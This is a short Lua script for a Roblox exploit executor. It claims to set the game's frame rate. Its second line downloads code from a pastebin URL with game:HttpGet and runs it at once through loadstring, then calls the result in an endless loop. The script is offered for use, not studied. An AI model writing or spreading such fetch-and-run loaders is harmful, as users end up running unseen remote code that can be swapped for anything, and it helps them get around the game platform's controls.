local fps = "120"
local SetFps = loadstring(game:HttpGet("https://pastebin.com/raw/U1Y31cUr"))()

local executor = identifyexecutor and identifyexecutor() or "Unknown Executor"

pcall(function()
    game.StarterGui:SetCore("SendNotification", {
        Title = executor .. " Executer Script Licence",
        Text = "set Fps to " .. fps,
        Duration = 5
    })
end)

spawn(function()
    while true do
        pcall(function()
            SetFps(fps)  
        end)
        wait(1)
    end
end)
